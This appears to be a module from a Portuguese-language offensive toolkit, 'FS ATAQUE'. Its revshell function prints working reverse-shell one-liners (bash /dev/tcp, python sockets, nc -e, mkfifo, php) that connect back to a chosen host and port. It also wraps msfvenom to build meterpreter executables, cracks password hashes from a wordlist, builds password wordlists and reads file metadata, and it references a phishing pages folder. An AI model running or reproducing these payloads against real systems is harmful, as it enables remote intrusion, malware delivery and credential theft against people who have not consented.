#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Utilitários / payload generators do FS ATAQUE.

import base64
import hashlib
import os
import subprocess
import urllib.parse

from core import utils


def revshell(alvo, ctx):
    """Gera payloads de reverse shell (bash, python, nc)."""
    # alvo da CLI = LHOST; extras = LHOST/LPORT quando alvo não usado
    if alvo:
        lhost = alvo
        lport = ctx["extras"][0] if ctx["extras"] else utils.perguntar("LPORT", "4444")
    else:
        lhost = ctx["extras"][0] if ctx["extras"] else utils.perguntar("LHOST (seu IP do lab)", "127.0.0.1")
        lport = ctx["extras"][1] if len(ctx["extras"]) > 1 else utils.perguntar("LPORT", "4444")
    if utils.is_dry(ctx):
        utils.mostrar_dry("revshell", "gerar payloads para {}:{}".format(lhost, lport))
        return
    payloads = {
        "bash": "bash -i >& /dev/tcp/{0}/{1} 0>&1".format(lhost, lport),
        "bash_2": "0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196".format(lhost, lport),
        "python": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'".format(lhost, lport),
        "python_2": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'".format(lhost, lport),
        "nc": "nc -e /bin/sh {0} {1}".format(lhost, lport),
        "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1}>/tmp/f".format(lhost, lport),
        "php": "php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(lhost, lport),
    }
    print(utils.c("\n  Reverse shells para {}:{}\n".format(lhost, lport), utils.VERDE))
    for nome, cmd in payloads.items():
        print("  [{}] {}".format(nome, cmd))
    print("\n  Escute com: nc -lvnp {}".format(lport))
    utils.log("revshell", "{}:{}".format(lhost, lport), "{} payloads gerados".format(len(payloads)))


def msfvenom(alvo, ctx):
    """Wrapper do msfvenom (se instalado)."""
    if utils.is_dry(ctx):
        utils.mostrar_dry("msfvenom", "gerar payload msfvenom")
        return
    if not utils.exigir_ferramenta("msfvenom"):
        print(utils.c("  msfvenom indisponivel — modulo ignorado.", utils.AMARELO))
        return
    payload = utils.perguntar("Payload", "windows/meterpreter/reverse_tcp")
    lhost = utils.perguntar("LHOST", "127.0.0.1")
    lport = utils.perguntar("LPORT", "4444")
    formato = utils.perguntar("Formato (-f)", "exe")
    saida = utils.perguntar("Arquivo de saida", "payload.{}".format(formato))
    cmd = ["msfvenom", "-p", payload, "LHOST={}".format(lhost), "LPORT={}".format(lport),
           "-f", formato, "-o", saida]
    print("  Executando: " + " ".join(cmd))
    try:
        subprocess.run(cmd, timeout=300)
        print(utils.c("  Payload salvo em {}".format(saida), utils.VERDE))
        utils.log("msfvenom", payload, "gerado: {}".format(saida))
    except Exception as e:
        print(utils.c("  Erro: {}".format(e), utils.VERMELHO))


def encoder(alvo, ctx):
    """Encoder/Decoder: base64, hex e URL."""
    print(utils.c("  [1] base64  [2] hex  [3] url", utils.VERDE))
    tipo = utils.perguntar("Tipo", "1")
    acao = utils.perguntar("acao: e=encode / d=decode", "e")
    texto = utils.perguntar("Texto")
    try:
        if tipo == "1":
            if acao == "e":
                resultado = base64.b64encode(texto.encode()).decode()
            else:
                resultado = base64.b64decode(texto.encode()).decode()
        elif tipo == "2":
            if acao == "e":
                resultado = texto.encode().hex()
            else:
                resultado = bytes.fromhex(texto).decode()
        else:
            if acao == "e":
                resultado = urllib.parse.quote(texto)
            else:
                resultado = urllib.parse.unquote(texto)
        print("  Resultado: {}".format(resultado))
        utils.log("encoder", "-", "ok")
    except Exception as e:
        print(utils.c("  Erro: {}".format(e), utils.VERMELHO))


def hash_crack(alvo, ctx):
    """Quebra hash MD5/SHA1/SHA256 com wordlist."""
    cfg = ctx["config"]
    alvo_hash = ctx["extras"][0] if ctx["extras"] else utils.perguntar("Hash (ou deixe vazio para arquivo)")
    wordlist = ctx["extras"][1] if len(ctx["extras"]) > 1 else cfg.get("wordlist_passwords", "wordlists/passwords.txt")
    if not alvo_hash:
        caminho_hash = utils.perguntar("Arquivo com hashes")
        try:
            with open(caminho_hash, encoding="utf-8") as f:
                alvos = [l.strip() for l in f if l.strip()]
        except Exception as e:
            print(utils.c("  Erro ao ler arquivo: {}".format(e), utils.VERMELHO))
            return
    else:
        alvos = [alvo_hash]
    senhas = utils.ler_lista(wordlist)
    if utils.is_dry(ctx):
        utils.mostrar_dry("hash_crack", "{} hashes x {} senhas".format(len(alvos), len(senhas)))
        return

    def computa(algo, txt):
        return hashlib.new(algo, txt.encode()).hexdigest()

    quebrados = 0
    for h in alvos:
        h = h.lower().strip()
        algoritmo = {32: "md5", 40: "sha1", 64: "sha256"}.get(len(h))
        if not algoritmo:
            print(utils.c("  Tamanho de hash nao suportado: {}".format(h[:16]), utils.AMARELO))
            continue
        achou = False
        for senha in senhas:
            if computa(algoritmo, senha) == h:
                print(utils.c("  [+] {} -> {} ({})".format(h, senha, algoritmo), utils.VERDE))
                quebrados += 1
                achou = True
                break
        if not achou:
            print(utils.c("  [-] nao quebrado: {}".format(h), utils.AMARELO))
    utils.log("hash_crack", "-", "{}/{} quebrados".format(quebrados, len(alvos)))


def wordlist_gen(alvo, ctx):
    """Gera wordlist combinando base + números/anos/sufixos."""
    base = ctx["extras"][0] if ctx["extras"] else utils.perguntar("Palavra base (ex.: senha)")
    if utils.is_dry(ctx):
        utils.mostrar_dry("wordlist_gen", "combinacoes de '{}'".format(base))
        return
    combinacoes = set()
    sufixos = ["", "123", "1234", "12345", "2024", "2025", "2026", "!", "@", "#", "1", "01", "12", "666", "999"]
    for s in sufixos:
        combinacoes.add(base + s)
        combinacoes.add(base.capitalize() + s)
        combinacoes.add(base.upper() + s)
    for n in range(100):
        combinacoes.add(base + str(n))
    pasta = utils.caminho("wordlists")
    os.makedirs(pasta, exist_ok=True)
    destino = os.path.join(pasta, "gerada_{}.txt".format(base))
    with open(destino, "w", encoding="utf-8") as f:
        f.write("\n".join(sorted(combinacoes)))
    print(utils.c("  {} combinacoes em {}".format(len(combinacoes), destino), utils.VERDE))
    utils.log("wordlist_gen", base, "{} linhas".format(len(combinacoes)))


def exif(alvo, ctx):
    """ExifTool wrapper — metadados de imagem/arquivo."""
    arquivo = alvo if alvo else utils.perguntar("Caminho do arquivo")
    if utils.is_dry(ctx):
        utils.mostrar_dry("exif", "exiftool {}".format(arquivo))
        return
    if not os.path.exists(arquivo):
        print(utils.c("  Arquivo nao encontrado.", utils.VERMELHO))
        return
    if utils.ferramenta_existe("exiftool"):
        out = subprocess.run(["exiftool", arquivo], capture_output=True, text=True)
        print(out.stdout)
        utils.log("exif", arquivo, "exiftool ok")
        return
    # Fallback: le o JPEG básico com Python puro
    print(utils.c("  exiftool nao encontrado — leitura basica (JPEG).", utils.AMARELO))
    try:
        with open(arquivo, "rb") as f:
            dados = f.read(65536)
        if dados[:2] == b"\xff\xd8":
            print("  Formato: JPEG")
            pos = 2
            while pos < len(dados) - 4:
                if dados[pos] != 0xFF:
                    break
                marcador = dados[pos + 1]
                tamanho = int.from_bytes(dados[pos + 2:pos + 4], "big")
                if marcador in (0xE1, 0xE2):
                    print("  Segmento APP{} de {} bytes".format(marcador - 0xE0, tamanho))
                    conteudo = dados[pos + 4:pos + 4 + tamanho]
                    for tag in (b"DateTime", b"Make", b"Model", b"GPS"):
                        if tag in conteudo:
                            print("  Encontrado: {}".format(tag.decode()))
                pos += 2 + tamanho
        else:
            print(utils.c("  Nao e JPEG — exiftool faria analise completa.", utils.AMARELO))
            utils.instalar_ferramenta("exiftool")
    except Exception as e:
        print(utils.c("  Erro: {}".format(e), utils.VERMELHO))


def qr_tools(alvo, ctx):
    """QR Code: gerador e leitor."""
    acao = utils.perguntar("acao: g=gerar / l=ler", "g")
    if acao == "l":
        arquivo = utils.perguntar("Imagem do QR", "modules/phishing/pages/qr.png")
        if utils.ferramenta_existe("zbarimg"):
            out = subprocess.run(["zbarimg", "-q", arquivo], capture_output=True, text=True)
            print(out.stdout or "(nenhum QR detectado)")
        elif utils.instalar_ferramenta("zbar" if utils.eh_termux() else "zbar-utils"):
            out = subprocess.run(["zbarimg", "-q", arquivo], capture_output=True, text=True)
            print(out.stdout or "(nenhum QR detectado)")
        else:
            print(utils.c("  Leitor de QR indisponivel (zbar).", utils.AMARELO))
        utils.log("qr_tools", arquivo, "leitura")
        return
    texto = alvo if alvo else utils.perguntar("Texto/URL para o QR")
    if utils.is_dry(ctx):
        utils.mostrar_dry("qr_tools", "gerar QR de '{}'".format(texto))
        return
    try:
        import qrcode
    except ImportError:
        if not utils.instalar_dependencia("qrcode"):
            print(utils.c("  QR cancelado — pacote 'qrcode' indisponivel.", utils.VERMELHO))
            return
        import qrcode
    qr_obj = qrcode.QRCode(border=1, box_size=1)
    qr_obj.add_data(texto)
    qr_obj.make(fit=True)
    qr_obj.print_ascii(invert=True)
    utils.log("qr_tools", texto, "QR gerado")
